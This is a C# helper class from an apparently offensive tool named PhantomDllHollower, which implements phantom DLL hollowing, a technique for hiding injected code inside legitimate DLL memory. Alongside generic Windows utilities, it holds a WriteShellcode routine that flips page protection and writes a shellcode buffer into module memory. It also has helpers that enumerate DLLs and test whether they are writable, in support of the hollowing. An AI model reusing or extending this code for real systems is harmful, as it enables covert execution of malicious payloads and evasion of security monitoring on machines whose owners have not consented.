using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using PhantomDllHollower.Interop;

namespace PhantomDllHollower.Library
{
    using NTSTATUS = Int32;

    internal class Helpers
    {
        public static bool CompareIgnoreCase(string strA, string strB)
        {
            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
        }


        public static void CopyMemory(IntPtr pDestination, IntPtr pSource, int nSize)
        {
            for (var offset = 0; offset < nSize; offset++)
                Marshal.WriteByte(pDestination, offset, Marshal.ReadByte(pSource, offset));
        }


        public static string GetFileOwnerSidString(string filePath)
        {
            NTSTATUS ntstatus;
            IntPtr pOwnerSid;
            SECURITY_DESCRIPTOR sd;
            string owner = null;
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
            var objectAttributes = new OBJECT_ATTRIBUTES(
                string.Format(@"\??\{0}", Path.GetFullPath(filePath)),
                OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive);

            ntstatus = NativeMethods.NtCreateFile(
                out IntPtr hFile,
                ACCESS_MASK.READ_CONTROL,
                in objectAttributes,
                pIoStatusBlock,
                IntPtr.Zero,
                FILE_ATTRIBUTES.NORMAL,
                FILE_SHARE_ACCESS.NONE,
                NT_FILE_CREATE_DISPOSITION.OPEN,
                FILE_OPEN_OPTIONS.NON_DIRECTORY_FILE,
                IntPtr.Zero,
                0u);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus == Win32Consts.STATUS_SUCCESS)
            {
                if (GetSecurityDescriptorInformation(
                    hFile,
                    SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
                    out IntPtr pSecurityDescriptor))
                {
                    sd = (SECURITY_DESCRIPTOR)Marshal.PtrToStructure(
                        pSecurityDescriptor,
                        typeof(SECURITY_DESCRIPTOR));

                    if (Environment.Is64BitProcess)
                        pOwnerSid = new IntPtr(pSecurityDescriptor.ToInt64() + sd.Owner);
                    else
                        pOwnerSid = new IntPtr(pSecurityDescriptor.ToInt32() + sd.Owner);

                    if (!NativeMethods.ConvertSidToStringSid(pOwnerSid, out owner))
                        owner = null;

                    Marshal.FreeHGlobal(pSecurityDescriptor);
                }

                NativeMethods.NtClose(hFile);
            }

            return owner;
        }


        public static Dictionary<string, IntPtr> GetLoadedModuleList()
        {
            var results = new Dictionary<string, IntPtr>();
            var modules = Process.GetCurrentProcess().Modules;

            foreach (ProcessModule mod in modules)
                results.Add(mod.ModuleName, mod.BaseAddress);

            return results;
        }


        public static string[] GetDllListFromDirectory(string dirPath)
        {
            string[] files = Directory.GetFiles(dirPath);
            var results = new List<string>();

            for (var idx = 0; idx < files.Length; idx++)
            {
                if (Regex.IsMatch(files[idx], @"\.dll$", RegexOptions.IgnoreCase))
                    results.Add(files[idx]);
            }

            return results.ToArray();
        }


        public static bool GetSecurityDescriptorInformation(
            IntPtr hObject,
            SECURITY_INFORMATION securityInformation,
            out IntPtr pSecurityDescriptor)
        {
            NTSTATUS ntstatus;
            bool status;
            uint nSecurityDescriptorSize = 0;
            pSecurityDescriptor = IntPtr.Zero;

            ntstatus = NativeMethods.NtQuerySecurityObject(
                hObject,
                securityInformation,
                pSecurityDescriptor,
                nSecurityDescriptorSize,
                out nSecurityDescriptorSize);

            if ((ntstatus != Win32Consts.STATUS_BUFFER_TOO_SMALL) || (nSecurityDescriptorSize == 0))
                return false;

            do
            {
                pSecurityDescriptor = Marshal.AllocHGlobal((int)nSecurityDescriptorSize);

                ntstatus = NativeMethods.NtQuerySecurityObject(
                    hObject,
                    securityInformation,
                    pSecurityDescriptor,
                    nSecurityDescriptorSize,
                    out nSecurityDescriptorSize);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Marshal.FreeHGlobal(pSecurityDescriptor);
                    pSecurityDescriptor = IntPtr.Zero;
                }
            } while (ntstatus == Win32Consts.STATUS_BUFFER_TOO_SMALL);

            return status;
        }


        public static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            var pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                    {
                        pNtdll = module.BaseAddress;
                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                        break;
                    }
                }
            }

            nReturnedLength = NativeMethods.FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            else
                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
        }


        public static bool IsWritableFile(string filePath)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
            var objectAttributes = new OBJECT_ATTRIBUTES(
                string.Format(@"\??\{0}", Path.GetFullPath(filePath)),
                OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive);

            ntstatus = NativeMethods.NtCreateFile(
                out IntPtr hFile,
                ACCESS_MASK.GENERIC_WRITE,
                in objectAttributes,
                pIoStatusBlock,
                IntPtr.Zero,
                FILE_ATTRIBUTES.NORMAL,
                FILE_SHARE_ACCESS.NONE,
                NT_FILE_CREATE_DISPOSITION.OPEN,
                FILE_OPEN_OPTIONS.NON_DIRECTORY_FILE,
                IntPtr.Zero,
                0u);
            Marshal.FreeHGlobal(pIoStatusBlock);
            status = (ntstatus == Win32Consts.STATUS_SUCCESS);

            if (status)
                NativeMethods.NtClose(hFile);

            return status;
        }


        public static NTSTATUS WriteShellcode(IntPtr hProcess, IntPtr pBaseAddress, byte[] shellcode)
        {
            NTSTATUS ntstatus;
            IntPtr pProtectBuffer = pBaseAddress;
            uint nProtectSize = (uint)shellcode.Length;

            ntstatus = NativeMethods.NtProtectVirtualMemory(
                hProcess,
                ref pProtectBuffer,
                ref nProtectSize,
                MEMORY_PROTECTION.READWRITE,
                out MEMORY_PROTECTION oldProtection);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
                return ntstatus;

            ntstatus = NativeMethods.NtWriteVirtualMemory(
                Process.GetCurrentProcess().Handle,
                pBaseAddress,
                shellcode,
                (uint)shellcode.Length,
                IntPtr.Zero);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
                return ntstatus;

            ntstatus = NativeMethods.NtProtectVirtualMemory(
                hProcess,
                ref pProtectBuffer,
                ref nProtectSize,
                oldProtection,
                out MEMORY_PROTECTION _);

            return ntstatus;
        }


        public static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }
    }
}
